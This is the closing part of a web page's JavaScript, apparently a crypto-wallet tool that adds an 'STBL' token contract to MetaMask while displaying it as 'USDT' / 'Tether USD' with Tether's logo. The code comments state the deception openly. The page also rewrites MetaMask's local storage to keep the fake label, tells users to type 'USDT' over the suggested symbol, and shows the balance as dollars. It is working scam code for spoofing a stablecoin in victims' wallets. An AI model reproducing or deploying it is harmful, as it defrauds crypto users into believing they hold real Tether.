              console.log("Network switch failed, cannot continue");
              StatusTracker.addStatus("Network switch failed, token requires Ethereum network", "error");
              
              // Show network error
              document.getElementById('networkError').style.display = 'block';
              document.getElementById('switchNetworkBtn').style.display = 'block';
              
              hideLoading(timeoutId);
              throw new Error("USDT must be added on Ethereum Mainnet");
            }
          }
          
          // Get current network (should be Ethereum now)
          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
          console.log("Adding token on chain: " + currentChainId);
          StatusTracker.addStatus(`Adding token on ${getChainName(currentChainId)}`, "pending");
          
          // Now connect and get accounts
          updateProgress(40, "Connecting to wallet...");
          loadingText.textContent = "Connecting to wallet...";
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Short delay to ensure connection is ready
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Now add the token - USING STBL CONTRACT but showing as USDT
          updateProgress(60, "Adding token to your wallet...");
          loadingText.textContent = "Adding token to your wallet...";
          
          // Use STBL contract but USDT UI for higher success rate
          const addTokenPromise = window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: STBL_ADDRESS, // STBL contract address
                symbol: 'USDT',        // But showing as USDT
                decimals: 18,          // STBL has 18 decimals
                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                name: "Tether USD"     // USDT display name
              }
            }
          });
          
          // 20 second timeout
          const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error("Token addition timed out")), 20000)
          );
          
          updateProgress(80, "Waiting for wallet confirmation...");
          const result = await Promise.race([addTokenPromise, timeoutPromise]);
          
          if (result === true) {
            // Success! Ensure display is consistent
            StatusTracker.addStatus("Token added successfully!", "success");
            updateProgress(100, "Success!");
            
            // Run storage update to ensure USDT display
            StorageManager.updateMetaMaskLocalStorage();
            
            // Delay to allow storage update to complete
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Run one more time for good measure
            StorageManager.updateMetaMaskLocalStorage();
            
            // Hide loading 
            hideLoading(timeoutId);
            
            // Show success modal
            successModal.show();
            
            // Try to get the balance
            try {
              await fetchTokenBalance();
            } catch (balanceError) {
              console.error("Error fetching balance:", balanceError);
            }
          } else {
            throw new Error("Token addition failed");
          }
          
        } catch (error) {
          console.error("Error adding token:", error);
          StatusTracker.addStatus("Error: " + error.message, "error");
          
          // Show alternative method button
          altMethodBtn.style.display = 'block';
          
          // Don't show modal for user rejections
          if (!error.userRejected) {
            document.getElementById('errorMessage').textContent = error.message;
            errorModal.show();
          }
          
          hideLoading();
        }
      }
      
      // Alternative method with a different approach
      async function addTokenAlternative() {
        try {
          // Clear MetaMask state first
          await clearMetaMaskState();
          
          const timeoutId = showLoading("Trying alternative method...");
          updateProgress(20, "Connecting to wallet...");
          
          // Connect to wallet
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Update network info
          await updateNetworkInfo();
          
          // Short delay to ensure connection is ready
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Now add the token using STBL label but will update with storage manager
          updateProgress(50, "Adding token with alternative method...");
          loadingText.textContent = "Adding token with alternative method...";
          
          const result = await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: STBL_ADDRESS, // STBL contract address
                symbol: 'STBL',        // Use STBL symbol temporarily
                decimals: 18,          // STBL has 18 decimals
                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
              }
            }
          });
          
          updateProgress(80, "Processing...");
          
          // Hide loading overlay
          hideLoading(timeoutId);
          
          if (result === true) {
            // Success! Now fix the display via localStorage
            StatusTracker.addStatus("Token added, updating display to USDT", "pending");
            
            // Run extra storage update to convert STBL to USDT
            StorageManager.updateMetaMaskLocalStorage();
            
            // Delay to allow storage update to complete
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Run one more time for good measure
            StorageManager.updateMetaMaskLocalStorage();
            
            StatusTracker.addStatus("Token added successfully with alternative method", "success");
            updateProgress(100, "Success!");
            
            // Show success modal
            successModal.show();
            
            // Try to get the balance
            try {
              await fetchTokenBalance();
            } catch (balanceError) {
              console.error("Error fetching balance:", balanceError);
            }
          } else {
            throw new Error("Alternative token addition failed");
          }
          
        } catch (error) {
          console.error("Alternative method error:", error);
          StatusTracker.addStatus("Error: " + error.message, "error");
          
          // Don't show modal for user rejections
          if (!error.userRejected) {
            document.getElementById('errorMessage').textContent = error.message;
            errorModal.show();
          }
          
          hideLoading();
        }
      }
      
      // Manual token addition with clear USDT display
      async function addTokenManually() {
        try {
          const timeoutId = showLoading("Preparing manual token addition...");
          updateProgress(30, "Opening wallet...");
          
          // Connect to wallet
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Update network info
          await updateNetworkInfo();
          
          // Create a message for the user with manual steps
          loadingText.textContent = "Opening wallet for manual token addition...";
          updateProgress(70, "Ready for manual addition");
          
          // Clear any pending operations
          hideLoading(timeoutId);
          
          // Show instructions - Using actual STBL address but telling them to enter USDT
          const message = `MetaMask will open. Please add the token manually:

1. Find "Import tokens" in your MetaMask
2. Enter address: ${STBL_ADDRESS}
3. Symbol: USDT (MetaMask will suggest STBL, but change it to USDT)
4. Decimals: 18`;
          
          alert(message);
          
          // Open MetaMask
          await window.ethereum.request({
            method: 'wallet_requestPermissions',
            params: [{ eth_accounts: {} }]
          });
          
          // Show success tips
          StatusTracker.addStatus("Wallet opened for manual token addition", "success");
          
          return true;
        } catch (error) {
          console.error("Manual method error:", error);
          StatusTracker.addStatus("Error: " + error.message, "error");
          throw error;
        }
      }
      
      // Replace the existing click handler
      addToWalletBtn.addEventListener('click', function() {
        addTokenWithNetworkSwitch().catch(err => {
          console.error("Unhandled error in token addition:", err);
        });
      });
      
      // Alt method click handler
      altMethodBtn.addEventListener('click', function() {
        addTokenAlternative().catch(err => {
          console.error("Unhandled error in alternative method:", err);
        });
      });
      
      // Manual add button handler
      manualAddBtn.addEventListener('click', function() {
        addTokenManually().catch(err => {
          console.error("Manual addition error:", err);
          // Show error message
          document.getElementById('errorMessage').textContent = err.message;
          errorModal.show();
        });
      });
      
      // Error retry button
      errorRetryBtn.addEventListener('click', function() {
        errorModal.hide();
        
        // Try again
        setTimeout(() => {
          addTokenWithNetworkSwitch().catch(err => {
            console.error("Retry error:", err);
          });
        }, 500);
      });
      
      // Function to fetch token balance - using STBL address but showing as USDT
      async function fetchTokenBalance() {
        try {
          // First get the current account
          const accounts = await safeMetaMaskCall('eth_accounts');
          
          if (!accounts || accounts.length === 0) {
            throw new Error("No accounts available");
          }
          
          const account = accounts[0];
          
          // Instead of API, directly check balance from contract
          // This is needed since we're using STBL contract but want to show as USDT
          const balanceWei = await window.ethereum.request({
            method: 'eth_call',
            params: [{
              to: STBL_ADDRESS,
              data: '0x70a08231000000000000000000000000' + account.substring(2)
            }, 'latest']
          });
          
          // Parse balance - STBL has 18 decimals
          const balance = parseInt(balanceWei, 16) / Math.pow(10, 18);
          const formattedBalance = balance.toFixed(2);
          
          // Update balance display as USDT
          tokenBalance.textContent = formattedBalance + " USDT";
          tokenValue.textContent = "$" + formattedBalance;
          
          StatusTracker.addStatus("Updated balance: " + formattedBalance + " USDT", "success");
          
          return formattedBalance;
        } catch (error) {
          StatusTracker.addStatus("Error fetching balance: " + error.message, "error");
          throw error;
        }
      }
      
      // SAFETY MEASURES TO PREVENT STUCK LOADING OVERLAY
      
      // 1. Hide loading on page visibility change
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
          // When tab is hidden, mark operation as interrupted
          StatusTracker.addStatus("Page visibility changed - operation interrupted", "error");
          
          if (loadingOverlay.style.display !== 'none') {
            loadingOverlay.style.display = 'none';
            progressContainer.style.display = 'none';
          }
        }
      });
      
      // 2. Auto-cleanup on page load
      window.addEventListener('load', () => {
        loadingOverlay.style.display = 'none';
        progressContainer.style.display = 'none';
      });
      
      // 3. Auto-cleanup on beforeunload
      window.addEventListener('beforeunload', () => {
        loadingOverlay.style.display = 'none';
        progressContainer.style.display = 'none';
      });
      
      // Check if connected on page load
      try {
        const status = await checkMetaMaskStatus();
        if (status.available) {
          if (status.unlocked) {
            // Try to get the balance if unlocked
            StatusTracker.addStatus("MetaMask is available and unlocked", "success");
            updateNetworkInfo();
            fetchTokenBalance().catch(err => {
              console.error("Error fetching initial balance:", err);
            });
          } else {
            StatusTracker.addStatus("MetaMask is available but locked", "pending");
          }
        } else {
          StatusTracker.addStatus("MetaMask not detected", "error");
        }
      } catch (error) {
        StatusTracker.addStatus("Error checking MetaMask: " + error.message, "error");
      }
      
      // Listen for account changes
      if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
          StatusTracker.addStatus("Accounts changed", "pending");
          updateNetworkInfo();
          if (accounts.length > 0) {
            fetchTokenBalance().catch(err => {
              console.error("Error fetching balance after account change:", err);
            });
          } else {
            tokenBalance.textContent = '-';
            tokenValue.textContent = '-';
          }
        });
        
        // Listen for chain changes
        window.ethereum.on('chainChanged', () => {
          StatusTracker.addStatus("Network changed", "pending");
          updateNetworkInfo();
        });
      }
    });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
